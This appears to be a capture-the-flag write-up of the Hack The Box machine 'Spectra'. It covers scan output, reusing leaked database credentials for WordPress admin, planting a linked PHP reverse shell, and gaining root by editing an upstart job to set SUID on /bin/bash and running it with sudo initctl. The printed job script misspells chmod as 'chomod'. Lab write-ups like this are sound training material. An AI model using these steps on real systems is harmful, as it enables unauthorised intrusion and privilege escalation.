## Enumeration

The first thing I try is to check all the port with nmap

```bash
Nmap scan report for spectra.htb (10.10.10.229)
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
```

So there is ssh, mysql and http ports open.
Opening the webpage we get this:

The below links dont work, and looking at the source code we see that the links have spectra.htb as the domain name.

![](/images/blog/spectra/2.png)

so we add that in our `/etc/hosts` file

```py:/etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.229    spectra.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now the page renders and we can see that its a WordPress site.

We get 2 hidden folders by running GoBuster

```py
/main                 (Status: 301) [Size: 169] [--> http://10.10.10.229/main/]
/testing              (Status: 301) [Size: 169] [--> http://10.10.10.229/testing/]
```

![](/images/blog/spectra/4.png)

Looking at the directory listing of `/testing/` we see a **.save** file

Opening it and looking at the source code we can see the database credentials

But if try to connect to mysql with the creds we found, it doesn't work

SSH doesnt work either :(

## FootHold

But on the wordpress site, we see there is a post made by administrator

Trying to log into the wp-login with administrator and the password we have works!

Now that we are inside the wp admin login, we can edit a page in an inactive theme and upload a php reverse shell.

I used [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) php reverse shell from pentestmonkey and put in my IP.

Then listen on port 1234 and then navigate to the 404 page.

We get a reverse shell!

## User Flag

Now that we have a shell, I run linpeas on the box.

After going through the huge output of linpeas, there is a autologin passwd file and we can see the password

And trying to ssh into the user Katie with that password works!

we now get the user flag

## Root Flag

By running `sudo -l` we see that we can run `/sbin/initctl` without the root password.

initctl starts or stops services in the `/etc/init/` folders

If we look into that folder, we find few files that can be edited by us.

we edit the `/etc/init/test.conf` file so that it looks like below

```py:/etc/init/test.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    chomod +s /bin/bash

end script
```

Now we can run this file with `sudo /sbin/initctl start test`

After the service has started, we just run `/bin/bash -p`

And we have root!
